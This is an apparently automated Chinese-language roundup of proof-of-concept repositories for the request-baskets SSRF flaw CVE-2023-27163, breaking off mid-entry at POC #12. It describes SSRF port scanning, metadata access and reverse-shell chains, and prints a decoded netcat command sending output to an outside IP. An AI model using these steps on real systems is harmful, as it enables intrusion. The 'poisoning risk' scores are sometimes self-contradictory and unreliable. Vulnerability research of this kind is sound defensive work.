# CVE-2023-27163

> 📦 该CVE有 **21** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-27163-G4sp4rCS_htb-sau-automated.md](../2023/CVE-2023-27163-G4sp4rCS_htb-sau-automated.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (Server-Side Request Forgery)

**影响应用:** request-baskets

**危害等级:** 中危，可以允许攻击者访问内部网络资源和敏感信息，根据CVSS评分，需要较高权限才能利用。

**影响版本:** <= 1.2.1

**利用条件:** 需要目标request-baskets服务可访问，且攻击者需要具备创建或修改basket的权限（通常需要认证，CVE描述里privilegesRequired是HIGH）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于request-baskets v1.2.1及更早版本中，位于`/api/baskets/{name}`组件。攻击者可以通过构造恶意的API请求，利用SSRF漏洞访问内部网络资源。根据PacketstormSecurity和Github的搜索结果，该漏洞存在公开的POC。漏洞利用方式如下：

1.  **mailtrail函数 (SSRF触发):** 首先，通过`mailtrail`函数，向`/api/baskets/pwned`发送POST请求，创建一个新的basket或者修改已存在的basket。请求的body包含`forward_url`参数，该参数指向攻击者控制的服务器（在`exploit.py`中，尝试指向`http://127.0.0.1:80/`，实际攻击中需要替换为攻击者控制的服务器），并设置`proxy_response`为`True`，这导致request-baskets会将请求转发到`forward_url`，从而触发SSRF。
2.  **exploit函数 (反弹shell):** 然后，利用`exploit`函数，向`/pwned/login`（`/pwned`是之前`mailtrail`创建的basket名字）发送POST请求。POST请求的body中的`username`参数包含一段bash代码，该代码首先将一段base64编码的payload解码，然后执行。该payload是一个python反弹shell脚本，它会连接攻击者指定的IP地址和端口，并将shell重定向到该连接。`os.system`函数执行的command将payload作为参数传递给`curl`，进一步通过shell进行执行。

**有效性:** 根据github和PacketstormSecurity的搜索结果，存在公开可用的POC代码，并且`exploit.py`代码看起来也实现了该POC的逻辑。因此，该POC代码应该是有效的。

**投毒风险:** 仔细分析了`exploit.py`的代码，未发现任何明显的投毒代码。该脚本的主要功能是利用SSRF漏洞触发反弹shell，其行为与漏洞描述一致。脚本中没有额外的恶意操作，例如删除文件、窃取凭据或安装后门。用于反弹shell的python代码虽然可以用来执行任意命令，但这是漏洞利用的一部分，不能算作投毒。所有操作都围绕着利用SSRF漏洞获取shell的目的。因此，投毒风险为0%。

**项目地址:** [G4sp4rCS/htb-sau-automated](https://github.com/G4sp4rCS/htb-sau-automated)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #2

**来源**: [CVE-2023-27163-Hamibubu_CVE-2023-27163.md](../2023/CVE-2023-27163-Hamibubu_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网资源访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问，并且攻击者可以发送POST请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者可以通过向 `/api/baskets/{name}` 发送特制的 API 请求，利用该漏洞发起服务器端请求伪造攻击。 

**有效性评估：**
根据漏洞库信息和搜索引擎结果，此漏洞的存在已得到确认，并且有公开可用的 PoC 代码。提供的 PoC 代码（CVE-2023-27163.py）看起来能够有效利用此漏洞。它允许攻击者指定一个目标 URL (`-t`) 和一个恶意 URL (`-e`)，然后创建一个新的 basket，并将其配置为将请求转发到恶意 URL。 这说明提供的POC代码有效。

**投毒风险分析：**
提供的代码主要包含以下几个文件：
*   `CVE-2023-27163.py`:  这是主要的 PoC 脚本，用于利用 SSRF 漏洞。脚本的逻辑是创建具有转发功能的 request-baskets，将流量转发到攻击者指定的 URL。
*   `README.md`:  包含脚本的使用说明。
*   `requirements.txt`:  列出了脚本所需的依赖项，只有 `requests>=2.25.1`，是一个常见的Python库。

没有发现明显的恶意代码。 但风险依然存在：

1.  **依赖风险：** `requirements.txt` 文件中声明了 `requests` 库。如果攻击者控制了上游 PyPI 仓库，并且能够投毒 `requests` 库，那么运行此脚本的用户可能会受到影响。此风险较低，因为 `requests` 是一个非常流行的库，任何投毒行为都会很快被发现。
2. **间接风险:**  虽然该POC本身没有发现恶意代码,但是使用者如果滥用此POC,比如扫描内网弱口令服务等,会造成更大的安全风险.

基于以上分析，我估计此仓库中存在作者隐藏的投毒代码的风险为 10%。主要是考虑到依赖项的潜在风险以及被滥用的可能。

**利用方式总结：**
1.  攻击者需要找到一个运行着易受攻击版本的 Request-Baskets 的服务器。
2.  攻击者使用 PoC 脚本（`CVE-2023-27163.py`）创建一个新的 basket，并设置 `forward_url` 参数为攻击者控制的恶意 URL。
3.  当有人访问新创建的 basket 时，Request-Baskets 服务器会向攻击者指定的 URL 发起请求，从而允许攻击者执行 SSRF 攻击，例如访问内部服务或泄露敏感信息。
4.  通过设置不同的 URL, 可以探测内网端口开放, 访问内网服务,甚至可以通过内网服务进行进一步的攻击。

**项目地址:** [Hamibubu/CVE-2023-27163](https://github.com/Hamibubu/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #3

**来源**: [CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md](../2023/CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可泄露内部信息，甚至可能造成远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 目标Request Baskets服务可访问，且内部可能存在其他服务（如Mailtrail v0.53）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者通过构造恶意的 API 请求到 `/api/baskets/{name}`，可以强制服务器向任意 URL 发起请求，从而访问内部网络资源。 

**漏洞利用方式：**

1.  **创建Basket并配置转发：**  利用 Request Baskets 的 API 创建一个新的 basket (例如 `pwned`)，并配置其 `forward_url` 指向内部服务 (如 `http://127.0.0.1:80/`，这里指向的是 Mailtrail)。
2.  **触发转发：**  访问创建的 basket (例如 `/pwned`)，这将导致 Request Baskets 服务器将请求转发到内部服务。
3.  **结合其他漏洞进行利用：**  如果内部服务存在其他漏洞（如Mailtrail v0.53 的远程代码执行漏洞），则可以进一步利用 SSRF 漏洞，例如通过访问 `/pwned/login` 并注入恶意payload来执行任意命令。
4.  **反弹shell：**  POC代码中，攻击者首先通过SSRF将内部Mailtrail服务暴露到`/pwned`，然后通过构造特定的URL，触发Mailtrail的RCE漏洞，从而反弹shell。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此POC代码**有效**。它演示了如何利用 Request Baskets 的 SSRF 漏洞，结合 Mailtrail 的漏洞，实现远程代码执行。

**投毒风险：**

POC代码相对清晰，主要逻辑是利用SSRF和RCE进行攻击。但是，`exploit.py`中直接使用`os.system(command)`执行命令存在一定风险。虽然当前command是为了反弹shell，但理论上如果`LISTENING_IP`和`LISTENING_PORT`被恶意修改，依然可以通过该命令执行其他任意操作，造成潜在的风险。

因此，判断投毒风险为10%。主要考虑是`os.system()`执行命令的潜在危险，以及代码来源的不可完全信任性。

**项目地址:** [HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53](https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #4

**来源**: [CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞位于`/api/baskets/{name}`组件中，允许攻击者通过构造恶意的API请求来访问网络资源和敏感信息。

**有效性评估：**

提供的PoC代码通过以下步骤利用该漏洞：

1.  **创建Basket：** PoC脚本首先创建一个具有随机名称的basket。
2.  **获取API Token：** 然后获取与该basket关联的API token，用于后续的身份验证。
3.  **配置Basket转发URL：**  使用PUT请求，将`forward_url`设置为`http://127.0.0.1:{port}/`，其中`{port}`是一个端口范围（75-81）。这会将发送到basket的所有请求转发到目标服务器（即运行Request-Baskets的服务器）上的指定端口。
4.  **发起请求：** 使用GET请求访问basket的URL，从而触发服务器端请求伪造。  如果目标端口上有服务运行，则PoC会打印该服务的响应。

此方法允许攻击者扫描目标服务器上的内部端口，并获取在这些端口上运行的服务的响应。根据漏洞描述和搜索结果中的信息，该PoC代码被认为是有效的。

**投毒风险评估：**

PoC代码本身相对简单，主要功能是利用SSRF漏洞扫描本地端口。以下几点需要注意：

*   **依赖关系：** 该脚本只依赖于requests库，这是一个常用的Python库，本身不太可能包含恶意代码。
*   **代码逻辑：** PoC的主要逻辑是发送HTTP请求，没有发现可疑的系统调用或文件操作。
*   **潜在风险：** 攻击者可能会修改`forward_url`以访问其他内部服务或执行更严重的操作，但这属于漏洞利用的范畴，而不是代码投毒。

根据对代码的分析，投毒风险较低，估计为5%。 主要风险来自于使用者如果未充分理解代码，直接运行或者修改`forward_url`参数，可能造成的非预期后果。

**利用方式：**

1.  **攻击者首先需要访问存在漏洞的Request-Baskets服务。**
2.  **攻击者构造一个包含目标内部地址（例如`127.0.0.1`或内部网络地址）的`forward_url`的PUT请求，以配置一个basket。** 这实质上是将Request-Baskets服务器配置为代理攻击者的请求。
3.  **攻击者发送一个GET请求到配置的basket URL。** Request-Baskets服务器将根据配置将此请求转发到内部地址。
4.  **如果内部地址存在服务，Request-Baskets服务器将返回该服务的响应给攻击者，从而泄露内部信息。**

通过这种方式，攻击者可以绕过防火墙和其他安全措施，访问通常无法从外部访问的内部服务，从而进行端口扫描、服务发现或获取敏感数据。

**项目地址:** [J0ey17/Exploit_CVE-2023-27163](https://github.com/J0ey17/Exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #5

**来源**: [CVE-2023-27163-KharimMchatta_basketcraft.md](../2023/CVE-2023-27163-KharimMchatta_basketcraft.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request-Baskets服务，且攻击者能够发送HTTP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞信息和搜索结果，CVE-2023-27163是Request-Baskets 1.2.1及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于`/api/baskets/{name}`组件。该漏洞允许攻击者通过构造恶意的API请求来访问内部网络资源和敏感信息。

**有效性评估：**
提供的漏洞利用代码 `basketcraft.sh` 似乎是有效的，因为它旨在自动化利用该SSRF漏洞的过程。它通过提示用户输入目标URL、basket名称和攻击者IP地址，构建一个包含恶意`forward_url`的JSON payload，然后使用curl发送POST请求来创建basket。创建成功后，脚本会输出token，并使用curl再次请求创建的basket URL来触发SSRF。如果成功，Request-Baskets将会向攻击者指定的IP地址和端口发起请求，攻击者可以使用Netcat监听该端口来验证漏洞利用。

**投毒风险评估：**
代码存在轻微的投毒风险。风险点主要在于脚本依赖用户输入`attackerip`。虽然这本身不是恶意代码，但如果攻击者在不知情的情况下运行该脚本，并在`attackerip`处输入了恶意IP，那么该恶意IP可能获取目标服务器的信息。因此，存在一定的欺骗性，让用户无意间参与攻击行为。另外该脚本也存在可读性问题和缺少详细注释等。因此，投毒风险评估为10%。

**漏洞利用方式：**
1.  **创建Basket：** 攻击者使用POST请求向`/api/baskets/{name}`发送请求，其中`{name}`是basket的名称。
2.  **构造Payload：** 在POST请求的body中，攻击者会构造一个JSON payload，其中包含`forward_url`字段。`forward_url`指向攻击者想要访问的内部资源，例如`http://internal_server:8080/admin`。
3.  **触发SSRF：** 当Request-Baskets收到发送到该basket的请求时，它会将该请求转发到`forward_url`指定的地址，从而触发SSRF漏洞。
4.  **信息获取：** 如果成功，攻击者可以通过Netcat监听端口来捕获来自目标服务器的响应，或者访问原本无法访问的内部服务。

总之，该漏洞利用方式相对简单，但可能需要一些社会工程学技巧才能诱使目标用户运行包含恶意`attackerip`的脚本。

**项目地址:** [KharimMchatta/basketcraft](https://github.com/KharimMchatta/basketcraft)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #6

**来源**: [CVE-2023-27163-MasterCode112_CVE-2023-27163.md](../2023/CVE-2023-27163-MasterCode112_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务器运行存在漏洞的Request-Baskets实例，且攻击者可以访问该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及以前版本中存在的服务器端请求伪造 (SSRF) 漏洞。通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，攻击者可以强制服务器向任意目标发起请求。根据漏洞利用代码，攻击者通过创建一个包含 `forward_url` 参数的 basket，该参数指向攻击者控制的服务器或内部网络资源。服务器会代理所有发送到该 basket 的请求到 `forward_url` 指定的地址。

**有效性：**
根据提供的漏洞信息，搜索引擎结果，以及漏洞利用代码，可以判断该漏洞是有效的，并且存在公开的POC。

**投毒风险：**
提供的脚本 `CVE-2023-27163.sh` 主要功能是创建具有转发功能的“basket”。虽然脚本本身没有明显的恶意代码，但用户在使用时需要注意以下几点：

1.  **目标服务器：**  脚本允许指定任意 `TARGET` 作为转发目标。如果攻击者控制了公共 Request-Baskets 实例，并将其转发到恶意服务器，则可能窃取用户的请求数据。
2.  **依赖外部命令：**  脚本依赖于 `curl` 和 `jq` 命令。如果这些命令被恶意替换，则可能执行恶意代码。但这种风险并非脚本本身引入，而是系统环境的风险。
3.  **创建的 Basket 长期存在：**  一旦创建了具有转发功能的 Basket，它将一直存在，除非被手动删除。如果攻击者创建了一个长期存在的恶意 Basket，可能会持续地捕获用户的请求。

由于脚本功能本身是利用漏洞进行请求转发，因此不能简单地将所有风险都归结为“投毒”。投毒风险主要来自于用户对脚本使用的环境和目标的信任程度。如果用户从不可信的来源下载脚本，或者将其应用于不可信的 Request-Baskets 实例，则存在一定的风险。此外，README.md 文件中的示例命令没有问题。

**利用方式：**
1.  攻击者使用 PoC 脚本创建一个恶意的 basket，并指定内部服务（例如，只能从本地访问的数据库管理界面）的 URL 作为 `forward_url`。
2.  当受害者（例如，管理员）访问该 basket 的 URL 时，Request-Baskets 服务器会向内部服务发起请求，并将响应返回给攻击者。
3.  通过这种方式，攻击者可以绕过防火墙或其他访问控制机制，访问内部网络资源。
4.  攻击者还可以使用该漏洞来探测内部网络，发现潜在的攻击目标。

**项目地址:** [MasterCode112/CVE-2023-27163](https://github.com/MasterCode112/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #7

**来源**: [CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md](../2023/CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要访问Request-Baskets服务的权限，利用需要目标服务的域名或者IP地址。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 版本及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
提供的 Python 脚本 `ssrf-to-port-scan.py` 利用了该漏洞，通过修改指定 Basket 的 `forward_url` 参数来触发 SSRF。脚本尝试扫描目标主机（默认为 `127.0.0.1`）的 1 到 65535 端口。如果端口关闭，则响应包含 "Failed to forward request" 字符串，脚本会打印 "Port closed"。否则，脚本会打印 "Port Open"。根据漏洞描述和脚本逻辑，可以判断该POC代码是有效的。

**投毒风险：**
审阅提供的 Python 脚本后，没有发现明显的恶意代码或后门。脚本的功能主要集中在利用 SSRF 漏洞进行端口扫描。代码行为符合预期，没有发现隐藏的、非预期的网络连接、文件操作或其他可疑行为。脚本注释中有少量需要修改的行数，以及对漏洞利用方式的简单解释，都是正常的提示信息。脚本存在明显的漏洞利用行为，但没有发现投毒代码。

**利用方式：**
1.  攻击者需要先获得对 Request-Baskets 服务的访问权限。
2.  攻击者需要创建一个 Basket 或者利用已存在的 Basket (例如，代码中使用的 `xfnq3md`)。
3.  攻击者通过 PUT 请求修改 Basket 的配置，将 `forward_url` 设置为攻击者想要访问的内部网络地址和端口。payload 可以通过json格式传递.
4.  当有用户访问该 Basket 时（例如，通过 GET 请求 `http://10.10.11.224:55555/xfnq3md`），Request-Baskets 服务会尝试将请求转发到 `forward_url` 指定的地址。
5.  如果 `forward_url` 指向内部服务，攻击者就可以通过 Request-Baskets 服务作为跳板来访问这些服务，从而实现 SSRF 攻击。

脚本使用 `proxy_response=True` 使得响应内容也会返回，因此可以判断端口是否开放。

**总结：**
该漏洞利用方式清晰，POC 代码有效，用于端口扫描。没有发现明显的投毒风险。攻击者需要能够访问 Request-Baskets 服务，并且能够操纵 Basket 的配置才能成功利用该漏洞。

**项目地址:** [Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning](https://github.com/Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #8

**来源**: [CVE-2023-27163-Rubioo02_CVE-2023-27163.md](../2023/CVE-2023-27163-Rubioo02_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露，甚至通过间接方式进行攻击。

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中存在的服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造特定的API请求，利用/api/baskets/{name}组件来访问内部网络资源或敏感信息。 

**利用方式：**

1.  攻击者使用提供的POC脚本，指定目标Request-Baskets服务器的URL和攻击者控制的URL。
2.  脚本会在Request-Baskets服务器上创建一个新的basket，并将`forward_url`设置为攻击者指定的URL。
3.  `proxy_response`设置为`true`，表示Request-Baskets会将从攻击者URL收到的响应返回给发起原始请求的客户端。
4.  攻击者随后向创建的basket发送请求。Request-Baskets服务器会将该请求转发到攻击者指定的URL。
5.  攻击者可以利用这一点来扫描内部网络，或访问受保护的资源。

**有效性：**

根据漏洞库信息和搜索结果，以及提供的POC代码，该漏洞是有效的。多个来源都提供了PoC，证明了漏洞的可利用性。

**投毒风险：**

提供的脚本主要功能是创建basket并设置forward_url，以实现SSRF攻击。检查了脚本内容，没有明显的恶意代码或后门，诸如反弹shell，植入挖矿程序等行为。但是，该脚本可能会被修改为包含恶意功能，因此存在一定的投毒风险，初步判断该仓库存在投毒代码的概率约为5%。使用该脚本的人员应仔细审查代码，确保其安全性。

**项目地址:** [Rubioo02/CVE-2023-27163](https://github.com/Rubioo02/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #9

**来源**: [CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md](../2023/CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，使服务器代表其向任意 URL 发起请求，从而访问内部网络资源或获取敏感信息。

**利用方式：**

1.  攻击者创建一个包含 `forward_url` 参数的恶意请求，该参数指向攻击者想要访问的内部或外部 URL。
2.  攻击者将此请求发送到 `/api/baskets/{name}` 端点，其中 `{name}` 是一个任意的 basket 名称。
3.  Request-Baskets 服务会向 `forward_url` 指定的 URL 发起请求，并将响应返回给攻击者。

提供的 PoC 代码 `CVE-2023-27163.py` 演示了如何利用此漏洞。它通过以下步骤工作：

1.  使用 `argparse` 处理命令行参数，包括目标 Request-Baskets 服务的 URL、目标 URL 和字典文件路径。
2. 从字典文件读取URL, 使用提供的目标 URL 和 wordlist 中的每一行来构建要fuzzing的 URL.
3.  构造一个包含 `forward_url` 的 JSON payload，并将其发送到 `/api/baskets/{name}` 端点以创建一个新的 basket。
4.  提取创建 basket 时返回的 token。
5.  再次使用该Payload进行Post请求.
6.  发送带有 token 的 GET 请求到创建的 basket，触发 SSRF。
7.  检查响应状态码。如果状态码为 200，则打印响应内容，表示攻击成功。
8.  删除创建的 basket。

**投毒风险：**

虽然代码主要功能是利用 SSRF 漏洞，但仍存在少量投毒风险。

*   **依赖管理风险：** PoC代码依赖 `requests` 库，恶意维护者可能通过植入后门版本导致攻击者受到攻击。此类风险概率较低，但后果严重，故评估为 5%。
*   **潜在的恶意 Wordlist：** PoC 使用了用户提供的 wordlist 文件。如果 wordlist 文件被篡改，包含恶意 URL，则可能导致攻击者在扫描内部网络时意外触发其他漏洞或服务，造成不必要的损害。

总体来说，该 PoC 代码的主要功能是 SSRF 利用，投毒风险较低，主要集中在依赖项和 wordlist 上。

**项目地址:** [ThickCoco/CVE-2023-27163-POC](https://github.com/ThickCoco/CVE-2023-27163-POC)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #10

**来源**: [CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露，内网端口扫描，访问内部服务

**影响版本:** <= 1.2.1

**利用条件:** 需要网络访问，目标应用运行request-baskets <= 1.2.1，并允许创建和访问basket。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request Baskets 1.2.1版本及以下版本中存在的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件发起对内部或外部资源的请求，从而读取敏感信息或攻击其他内部服务。

**有效性分析：**
根据搜索引擎结果和漏洞库信息，该漏洞的POC已公开。提供的POC代码看起来不像是直接攻击`/api/baskets/{name}`这个SSRF端点，而是尝试利用登录页面进行命令注入。这可能是在没有权限创建basket的情况下进行的尝试，或者该实例的配置允许登录。

**投毒风险分析：**
给定的POC代码尝试使用`echo ... | base64 -d | sh`来执行命令，这是一种常见的反弹shell的方式。username参数的值被拼接成了一个shell命令，该命令将一段base64编码的字符串解码后通过sh执行。如果攻击成功，则会在目标服务器上执行任意命令。因此，**存在投毒风险**。`echo` 和 `base64` 是Linux常见的命令，payload部分`aWR8bmMgMTkyLjE2OC40NS4yNDkgODA=`解码后是`id|nc 192.168.45.249 80`，这明显是尝试执行命令并且反弹shell。因此存在投毒风险。由于 POC 本身就是一个反弹shell的尝试，因此判定投毒概率为 10%，主要是考虑命令注入点不一定是预期点。

**利用方式：**
1.  攻击者找到存在漏洞的Request Baskets实例。
2.  攻击者利用`/api/baskets/{name}`组件，构造包含恶意URL的请求。
3.  Request Baskets服务器解析该URL并向目标服务器发起请求。
4.  攻击者可以读取目标服务器返回的内容，或者利用目标服务器的漏洞进行进一步的攻击。根据本次提供的漏洞利用代码，是尝试通过登录界面的username参数进行命令注入，来获取权限后进行利用。

**项目地址:** [btar1gan/exploit_CVE-2023-27163](https://github.com/btar1gan/exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #11

**来源**: [CVE-2023-27163-cowsecurity_CVE-2023-27163.md](../2023/CVE-2023-27163-cowsecurity_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request Baskets服务可用，攻击者需要知道目标Request Baskets服务的URL

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-27163是Request Baskets 1.2.1及之前版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件来访问内部网络资源和敏感信息。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的存在已被确认，并且有多个PoC代码可用。提供的PoC代码通过创建一个新的basket，并将`forward_url`设置为攻击者的服务器，来触发SSRF漏洞。当有人访问新创建的basket时，Request Baskets服务器将向攻击者的服务器发起请求。

**投毒风险：**

查看PoC代码，该代码主要功能是利用SSRF漏洞，没有发现明显的恶意代码或后门。`requirements.txt`文件只包含`requests`和`pyfiglet`两个常用的库，没有发现异常依赖。`README.md`文件提供的是关于漏洞的描述，安装方法和使用方法，也没有包含恶意代码。但考虑到任何代码都存在潜在风险，此处判定存在极低的投毒风险，约为1%。

**利用方式：**

1.  **部署Request Baskets:** 首先，需要部署一个存在漏洞的Request Baskets实例（版本<= 1.2.1）。
2.  **运行PoC脚本:** 运行提供的Python脚本`CVE-2023-27163.py`，指定目标Request Baskets服务的URL和攻击者的服务器URL。
3.  **创建恶意Basket:** 脚本会创建一个新的basket，并将`forward_url`设置为攻击者的服务器。
4.  **触发SSRF:** 任何访问新创建的basket的用户都会导致Request Baskets服务器向攻击者的服务器发起请求。攻击者可以在其服务器上捕获这些请求，并获取敏感信息，或者利用这些请求访问内部网络资源。

例如，攻击者可以将`attack_server`设置为内部服务的地址，例如`http://169.254.169.254/latest/meta-data`来获取云服务器的元数据。


**项目地址:** [cowsecurity/CVE-2023-27163](https://github.com/cowsecurity/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #12

**来源**: [CVE-2023-27163-davuXVI_CVE-2023-27163.md](../2023/CVE-2023-27163-davuXVI_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可能导致内部网络信息泄露、敏感信息访问，甚至远程代码执行。

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行Request Baskets，并且攻击者能够发送HTTP请求到目标服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，利用 `forward_url` 参数发起对内部或外部资源的请求。

**漏洞利用方式：**

1.  攻击者创建一个新的 basket，并在创建时通过 `forward_url` 指定一个恶意 URL。Request Baskets 将会尝试请求这个 URL。
2.  攻击者可以利用此漏洞读取内部服务的信息，例如元数据 API、数据库等。
3.  结合其他漏洞，例如利用Request Basket的路径遍历，在`rce_end`函数中通过python开启web服务，利用`wget`来执行攻击者服务器上的shell脚本`rev.sh`，从而实现远程代码执行。

**有效性：**

提供的PoC 代码看起来是有效的。该脚本接受目标 IP 地址、转发 IP 地址和攻击者 IP 地址作为参数。它首先创建一个带有 `forward_url` 的 basket，然后通过HTTP服务暴露反弹shell脚本，并通过request basket的路径遍历漏洞和wget命令执行反弹shell，实现RCE。

**投毒风险：**

该脚本的主要目的是利用 SSRF 漏洞实现 RCE，其中`my_script.sh`脚本在`/tmp/5d6d5c10a3b6d097d6e642a3dc9d71b8/my_script_CVE-2023-27163.sh`文件中。

